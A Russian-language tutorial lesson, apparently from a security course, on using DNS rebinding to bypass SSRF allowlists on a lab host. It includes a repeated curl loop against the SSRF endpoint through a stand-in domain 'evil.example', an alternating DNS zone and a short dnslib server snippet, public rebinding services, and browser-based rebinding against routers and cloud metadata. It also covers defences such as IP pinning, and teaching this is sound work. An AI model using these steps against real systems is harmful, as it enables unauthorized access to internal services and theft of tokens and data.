Разработчики читали про SSRF и поставили защиту: перед запросом сервер **проверяет**, что домен из нашего URL резолвится в публичный IP, и запрещает внутренние адреса. Казалось бы, надёжно. Но есть изъян: проверка и сам запрос происходят в **разные моменты**, а DNS за это время может ответить по-разному. На этом и строится **DNS rebinding**.

Возьмём `shop.local` с «безопасной» SSRF-ручкой и обойдём её allowlist.

## Наш пример: защищённая SSRF-ручка

Приложение добавило проверку адреса. Пробуем внутренний IP напрямую:

```bash
$ curl -s 'https://shop.local/tools/fetch' -d 'url=http://169.254.169.254/'
{"error":"blocked: private address"}
```

Заблокировано. Значит, сервер резолвит хост и проверяет результат. Но что, если хост — это домен, который **я контролирую** и который может отвечать по-разному в разные секунды?

## Шаг 1: где здесь окно (TOCTOU)

Вспомним классическую ошибку проверки и использования — **TOCTOU** (Time-Of-Check to Time-Of-Use). Код делает примерно так:

```python
ip = resolve(host)               # 1. проверяем адрес
if is_private(ip): return error  # 2. отсекаем внутренние
response = http_get(url)         # 3. делаем запрос
```

Между шагом 1 и шагом 3 проходит время. Если DNS на шаге 1 вернёт публичный адрес (проверка пройдёт), а на шаге 3 — `127.0.0.1`, сервер обратится к внутреннему сервису, хотя «проверял» публичный. Обычно библиотеки кэшируют DNS, поэтому нужен маленький **TTL** (время жизни записи) — тогда второй резолв пойдёт на сервер заново.

## Шаг 2: поднимаем свой DNS

Регистрируем домен (или используем сервисы вроде `rbndr.us`/`1u.ms`, где rebinding готов из коробки) и настраиваем его DNS так, чтобы он **чередовал** ответы:

```
evil.example  A  203.0.113.10   ; наш публичный сервер (проходит проверку)
evil.example  A  127.0.0.1      ; внутренний адрес (цель)
```

с TTL = 0. Теперь при каждом запросе DNS отвечает по-разному. Сценарий: первый резолв (для проверки) — `203.0.113.10`; второй (для запроса) — `127.0.0.1`.

## Шаг 3: готовим payload и повторяем запрос

Проще всего, если наш публичный сервер сначала отвечает как обычный хост, а после «переключения» DNS запрос идёт уже на localhost. Отправляем URL много раз — рано или поздно окно совпадёт:

```bash
$ for i in $(seq 1 20); do
    curl -s 'https://shop.local/tools/fetch' -d 'url=http://evil.example/admin' | head -c 80; echo; done
{"error":"blocked: private address"}
{"error":"not an image"}
{"error":"invalid image header: <html><title>Admin</title>..."}
```

На третьей строке видно: сервер обратился к **внутренней** админке на `127.0.0.1`. Проверка (первый резолв → публичный IP) прошла, а запрос (второй резолв → `127.0.0.1`) попал внутрь. Мы обошли allowlist, не зная ни одного внутреннего IP.

## Шаг 4: зачем это сильнее обычных обходов

Обходы вроде `http://127.1/` или `http://2130706433/` работают только против фильтров, которые **сравнивают строку**. Против фильтра, который **резолвит** хост и проверяет IP, они бесполезны. DNS rebinding бьёт именно по такому «умному» фильтру: проверка проходит, а запрос уходит не туда. Это TOCTOU в чистом виде.

## Шаг 5: почему это вообще возможно

Идея в том, что доменное имя и IP-адрес — не одно и то же. Имя — это лишь «метка», которую каждый раз заново переводит DNS. Сервер проверяет перевод один раз, а соединение делает по другому переводу. Пока эти два перевода совпадают, всё выглядит безопасно; как только мы научились ими управлять — фильтр обманут. Иначе говоря, уязвимость не в DNS, а в том, что приложение доверяет **первому** ответу и не фиксирует адрес до самого соединения. Ключевое условие успеха — короткий TTL и повтор запроса, потому что окно совпадения очень маленькое.

## Шаг 6: варианты и современные приёмы

- **Свой DNS-сервер** (например, на `dnschef` или собственном скрипте) — полный контроль над ответами и TTL.
- **`rebind`-сервисы** (`rbndr.us`, `lock.cmpxchg8b.com`) — дают готовый чередующийся домен.
- **Редирект вместо rebinding** — если ручка следует `302`, наш сервер сам отдаёт `Location: http://127.0.0.1/`; фильтр видит только наш домен.
- **Повтор попыток** — окно маленькое, поэтому запрос повторяют; часто нужен всего один «удачный» резолв.

## Шаг 7: как это ломают на практике

Классический сценарий — внутренняя админка или служебный API, доступный только с localhost. Через rebinding мы доходим до них, а дальше обычные техники: SSRF к метаданным, обход авторизации «по IP», доступ к `/debug`, чтение внутренних API. Иногда одного успешного окна достаточно, чтобы вытащить токен или данные.

## Шаг 8: как поднять свой rebinding-DNS

Если готовые сервисы недоступны, можно поднять свой DNS-сервер. Идея: на каждый A-запрос отвечать по очереди то публичным, то внутренним адресом, с TTL=0. Упрощённо это выглядит так (псевдокод на Python с библиотекой `dnslib`):

```python
from dnslib import RR, A, QTYPE
state = {"n": 0}
def answer(qname):
    state["n"] += 1
    ip = "203.0.113.10" if state["n"] % 2 else "127.0.0.1"
    return RR(qname, QTYPE.A, rdata=A(ip), ttl=0)
```

Домен `evil.example` делегируем на этот сервер. Теперь каждый второй резолв ведёт на localhost. Остаётся повторять запрос к уязвимой ручке, пока «проверка» и «использование» не попадут на разные ответы. Тот же трюк делают сервисы вроде `rbndr.us`: они отдают то один, то другой адрес без своего сервера.

## Шаг 9: как от этого защищаются

Правильная защита — не резолвить хост и потом ходить по имени, а **соединяться сразу по проверенному IP** (IP-пиннинг): разрешить хост один раз, зафиксировать IP, проверить его и делать запрос строго на этот IP (а имя передавать в заголовке `Host`). Тогда второго резолва просто не будет. Дополнительно закрывают внутренние диапазоны на сетевом уровне (egress-фильтр), запрещают редиректы и не дают приложению ходить на метаданные.

## Инструмент: dig — DNS-запросы

`dig` шлёт DNS-запросы и показывает ответ целиком: записи, авторитетные серверы, флаги. Основной инструмент DNS-разведки.

Ключи, которые пригодятся:
* `dig <имя>` — A-запись; `dig <имя> TXT` — текст (часто там секреты);
* `dig +short <имя> <тип>` — только значение, без «шапки»;
* `dig @<сервер> <имя>` — спросить конкретный резолвер;
* `dig axfr <домен> @<ns>` — попытка переноса зоны.

### Рабочий пример (как в лаборатории)

```
$ dig evil.example A

;; ANSWER SECTION:
evil.example.	0	IN	A	203.0.113.10
evil.example.	0	IN	A	127.0.0.1
```

Подсказка из лаборатории: `dig <имя> [A] — DNS-запрос (эмуляция чередующегося домена)`.

## Что мы теперь знаем

- **DNS rebinding** эксплуатирует разрыв между проверкой адреса и его использованием (**TOCTOU**).
- Свой DNS с TTL=0 чередует ответы: публичный IP для проверки, внутренний для запроса.
- Работает против фильтров, которые **резолвят** хост, а не сравнивают строку.
- Помогает малый TTL и повтор запроса.
- Родственный приём — редирект с нашего сервера на внутренний адрес.

## На что смотреть дальше

- **Признак уязвимости:** сервер проверяет «приватность» IP — значит, rebinding уместен.
- **Готовые сервисы:** `rbndr.us`, `1u.ms`, `lock.cmpxchg8b.com` экономят время.
- **Комбинация с metadata:** после rebinding сразу пробуй `169.254.169.254`.
- **Учитывай кэш:** если библиотека кэширует DNS надолго, TTL=0 не поможет — ищи другой путь.
- **Проверяй оба резолва:** иногда достаточно, чтобы «проверка» и «запрос» разошлись лишь на секунду — повторяй запрос терпеливо.

## Rebinding в браузере: атака на роутер изнутри

Тот же приём работает и без SSRF. Браузер жертвы заходит на наш сайт `evil.example`, мы отдаём страницу с JavaScript, а затем переключаем DNS на `192.168.0.1`. Запросы из браузера к `http://evil.example/` теперь идут на роутер, и, поскольку origin остаётся `evil.example`, браузер не считает это cross-origin обращением. Так читают админки роутеров, принтеров и NAS, у которых нет CSRF-защиты и которые доверяют «локальным» запросам. Ограничение — DNS pinning: часть браузеров кэширует резолв на время жизни соединения, и переключение не срабатывает. Современные браузеры дополнительно требуют Private Network Access — явного разрешения на запрос из публичного контекста в приватный.

Отличие от серверного rebinding принципиально: там мы управляем резолвом на сервере-жертве и обходим его allowlist; здесь резолвит браузер пользователя, а мы обходим same-origin. Уязвимость в обоих случаях одна — доверие к имени, а не к зафиксированному адресу.

## Как усилить атаку: повтор, редирект и порт-скан

Окно совпадения мало, поэтому rebinding комбинируют с приёмами, повышающими шанс. Первое — повтор: страница в цикле шлёт запрос каждые несколько миллисекунд, пока один из них не уйдёт на внутренний IP. Второе — редирект: если уязвимая ручка следует `302`, наш публичный сервер сам отвечает `Location: http://127.0.0.1:PORT/`, и allowlist проверяет только наш домен. Третье — порт-скан через rebinding: перебирая порты, можно нащупать живые внутренние сервисы по времени ответа или разнице в коде. Четвёртое — TTL-трюки: держать ответ с публичным IP «дольше», чтобы проверка почти всегда проходила, а на запрос оставить короткое окно внутреннего адреса. Всё это вариации одной идеи — развести проверку и использование во времени.

## Куда дальше

Мы обошли allowlist и дотянулись до localhost. Но не всегда сервер — обычная VM: всё чаще код живёт в **serverless** (Lambda, Cloud Functions), где нет ни диска, ни SSH, но есть свои особенности. В следующем уроке разберём атаки на serverless: SSRF к метаданным, инъекции в event-объекты и злоупотребление ролями.

## Где пригодится

- **CTF (Web):** задачи с «умной» SSRF-защитой — rebinding часто единственный путь.
- **Bug bounty:** обход SSRF-фильтров — сильный аргумент в отчёте; докажи доступ к внутреннему сервису.
- **Пентест:** проверка SSRF-ручек с валидацией адреса на устойчивость к TOCTOU.
- **Работа (AppSec):** проверять адрес после соединения, использовать IP-пиннинг, запрещать внутренние диапазоны на сетевом уровне.
